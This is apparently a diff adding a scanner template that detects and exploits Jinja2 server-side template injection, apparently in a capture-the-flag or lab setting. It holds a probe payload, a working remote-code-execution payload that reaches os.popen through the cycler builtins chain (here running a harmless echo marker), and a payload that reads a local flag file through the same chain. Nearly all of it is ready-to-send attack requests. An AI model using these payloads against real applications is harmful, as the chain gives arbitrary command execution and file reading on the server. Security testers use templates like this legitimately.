@@ -1,0 +1,18 @@
+id: tpl/jinja2-ssti-rce
+summary: Jinja2 SSTI probe and RCE via the cycler builtins chain.
+param: template
+
+http probe
+  # the renderer evaluates the template field
+  get "/render" with "{{7*7}}"
+  expect "49" in the response
+
+http rce
+  # arbitrary command execution through the builtins chain
+  get "/render" with "{{ cycler.__init__.__globals__.__builtins__.__import__('os').popen('echo REPL_RCE_MARKER').read() }}"
+  expect "REPL_RCE_MARKER" in the response
+
+http read-flag
+  # read a local file through the same chain
+  get "/render" with "{{ cycler.__init__.__globals__.__builtins__.open('{flag_path}').read() }}"
+  expect a flag
